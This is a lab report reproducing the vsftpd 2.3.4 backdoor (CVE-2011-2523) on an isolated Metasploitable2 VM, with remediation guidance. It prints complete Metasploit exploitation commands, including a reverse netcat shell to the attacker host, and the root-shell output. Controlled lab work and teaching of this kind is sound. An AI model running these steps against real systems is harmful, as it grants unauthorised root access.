# Task 2, Part D — CVE Reproduction Report

**CVE:** CVE-2011-2523 — vsftpd 2.3.4 Backdoor Command Execution  
**CVSS Score:** 10.0 (Critical)  
**Public PoC:** Metasploit module `exploit/unix/ftp/vsftpd_234_backdoor`  
**Target:** Metasploitable2 (intentionally vulnerable Linux VM)  
**Attacker:** Kali Linux 2026.2

---

## 1. Lab Network Layout

| Machine | Role | IP Address | Adapter |
|---|---|---|---|
| Kali Linux 2026.2 | Attacker | 192.168.206.128 | VMware VMnet1 (Host-Only) |
| Metasploitable2 | Target | 192.168.206.130 | VMware VMnet1 (Host-Only) |

Both VMs were placed on VMware's **VMnet1 Host-Only** virtual network — a private virtual network with no bridge to any physical LAN adapter or internet gateway. The host machine's real network adapter (Wi-Fi) is on `192.168.132.0/24`, a completely separate subnet with no routing to or from `192.168.206.0/24`.

**Network topology diagram:**

```
┌─────────────────────────────────────────────────────────┐
│  VMware Host-Only Network (VMnet1): 192.168.206.0/24    │
│                                                         │
│  ┌─────────────────┐        ┌──────────────────────┐   │
│  │  Kali Linux     │◄──────►│  Metasploitable2     │   │
│  │  192.168.206.128│        │  192.168.206.130     │   │
│  │  (Attacker)     │        │  (Target/Vulnerable) │   │
│  └─────────────────┘        └──────────────────────┘   │
└─────────────────────────────────────────────────────────┘
         │
         │ (Host virtual adapter only — no bridge outward)
         ▼
┌─────────────────────────────────────────────────────────┐
│  Real Host LAN (Wi-Fi): 192.168.132.0/24               │
│  Host machine: 192.168.132.176 — CANNOT reach .206.130 │
│  Internet: CANNOT be reached from 192.168.206.130      │
└─────────────────────────────────────────────────────────┘
```

**Isolation confirmed:**

- Kali ↔ Metasploitable2: reachable (4/4 ping packets received — `2d-03-kali-ping-metasploitable-success.png`)
- Metasploitable2 → 8.8.8.8 (internet): `Network is unreachable` — no outbound route exists (`2d-07-metasploitable-ping-internet-unreachable.png`)
- Host machine's real subnet (`192.168.132.0/24`) vs. lab subnet (`192.168.206.0/24`): entirely separate, non-routed networks (`2d-06-host-ipconfig-separate-subnet.png`)

**The vulnerable target (Metasploitable2 at 192.168.206.130) was not reachable from the real host network or the internet — only from within the isolated VMnet1 lab segment.**

---

## 2. Vulnerability Description

**CVE-2011-2523** describes a malicious backdoor that was secretly introduced into the vsftpd 2.3.4 source code tarball distributed on the official vsftpd project site between 30 June and 1 July 2011. The backdoor was not present in the version-controlled source repository — it was inserted only into the downloadable tarball on the main distribution server, suggesting a compromise of the server itself rather than the codebase.

**Mechanism:** When a user attempts to log into the FTP server and their username string contains a smiley face sequence (`:)`), the backdoor code opens a listener on **TCP port 6200** on the target host and spawns `/bin/sh` bound to that port — granting any connecting client a direct command shell running as `root` (since vsftpd runs as root to manage privilege separation). No authentication is required: the backdoor activates unconditionally on any login attempt containing `:)` in the username, regardless of password, and immediately grants full root access.

**Affected version:** vsftpd 2.3.4 (the backdoored tarball only — later clean versions exist).  
**Affected port:** FTP on TCP/21 (trigger), shell on TCP/6200 (backdoor listener).

---

## 3. Reconnaissance

Version discovery via Nmap:

```
$ nmap -sV -p 21 192.168.206.130
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

The service banner confirms vsftpd 2.3.4 — the exact vulnerable version. Nmap's service detection alone identifies the target without needing authentication or any intrusive probe.

Screenshot: `2d-08-nmap-vsftpd-234-confirmed.png`

---

## 4. Exploitation

Metasploit's `exploit/unix/ftp/vsftpd_234_backdoor` module automates the trigger and connection:

```
msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.206.130
msf exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/reverse_netcat
msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.206.128
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
```

**Exploit output:**
```
[*] Started reverse TCP handler on 192.168.206.128:4444
[*] 192.168.206.130:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.206.130:21 - The target appears to be vulnerable.
[+] 192.168.206.130:21 - Backdoor has been spawned!
[*] Command shell session 1 opened (192.168.206.128:4444 → 192.168.206.130:57531)
```

Screenshots: `2d-09-msf-search-vsftpd-use-module.png`, `2d-12-msf-exploit-shell-opened.png`

---

## 5. Post-Exploitation Proof

Commands executed inside the obtained shell:

```
id
uid=0(root) gid=0(root)

whoami
root

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

hostname
metasploitable
```

**Result: full root shell obtained on Metasploitable2 (`192.168.206.130`) from the Kali attacker machine (`192.168.206.128`), with no credentials required beyond a single login attempt containing `:)` in the username.**

Screenshots: `2d-13-root-shell-id-whoami.png`, `2d-14-root-shell-uname-hostname.png`

---

## 6. Remediation

### Immediate fixes

| Action | Detail |
|---|---|
| **Upgrade vsftpd immediately** | Replace vsftpd 2.3.4 with any subsequent clean release (2.3.5+ or the current stable version). Verify the downloaded tarball's SHA-256/MD5 checksum against the official checksum published in the project's version control repository — not from the same distribution server, since that was the compromised source. |
| **Block port 6200 at the firewall** | As an emergency containment measure, block inbound connections to TCP/6200 at the perimeter and host firewall until the service is updated. This prevents exploitation even if a patched version cannot be deployed immediately. |
| **Disable or replace vsftpd entirely** | If FTP is not strictly required, disable the service. FTP transmits credentials in plaintext and is superseded by SFTP (SSH File Transfer Protocol) and FTPS for all legitimate use cases. |

### Structural / process fixes

| Action | Detail |
|---|---|
| **Verify software supply chain integrity** | The vsftpd backdoor was introduced at the distribution level, not in the source repository — a supply-chain attack. All downloaded binaries and source tarballs should have their checksums verified against a trusted, independent source (not the same server). |
| **Principle of least privilege** | vsftpd ran as root to perform privilege-separation operations; the backdoor inherited root. Containerization (Docker, SELinux/AppArmor confinement, chroot jails) would not have prevented the backdoor from triggering, but would have limited the blast radius — the shell obtained would have been confined rather than a full system root. |
| **Network segmentation** | As demonstrated by this lab: placing vulnerable services on an isolated, non-internet-routable network segment limits the attacker's reach even if exploitation succeeds. In a real environment, an FTP server should not be reachable from arbitrary internet hosts. |
| **Intrusion detection** | A connection to port 6200 immediately following an FTP login attempt containing `:)` is a distinctive, easily-signatured event. Network IDS/IPS rules (Snort/Suricata) can detect and alert on this pattern. |

### Why this matters beyond the specific CVE

The vsftpd 2.3.4 backdoor is historically significant as an early, documented example of a **software supply-chain attack** — a category now recognized as one of the highest-impact threat vectors (see SolarWinds/SUNBURST 2020, XZ Utils backdoor 2024). The lesson is not specific to vsftpd: any software download, dependency, or update mechanism is a potential insertion point, and checksum verification against an independent, trusted source is the minimum viable defense.

---

## Summary

| Item | Detail |
|---|---|
| CVE | CVE-2011-2523 |
| Vulnerability | Malicious backdoor in vsftpd 2.3.4 tarball; triggers on `:)` in username, opens root shell on port 6200 |
| Target | Metasploitable2 — 192.168.206.130 (VMnet1 Host-Only, isolated) |
| Attacker | Kali Linux — 192.168.206.128 (same isolated segment) |
| Tool used | Metasploit `exploit/unix/ftp/vsftpd_234_backdoor` + `cmd/unix/reverse_netcat` payload |
| Result | Full root shell: `uid=0(root) gid=0(root)` on `hostname: metasploitable` |
| Internet reachability of target | Confirmed unreachable (`Network is unreachable` on outbound ping) |
| Fix | Upgrade vsftpd; verify checksums; block port 6200; prefer SFTP over FTP |
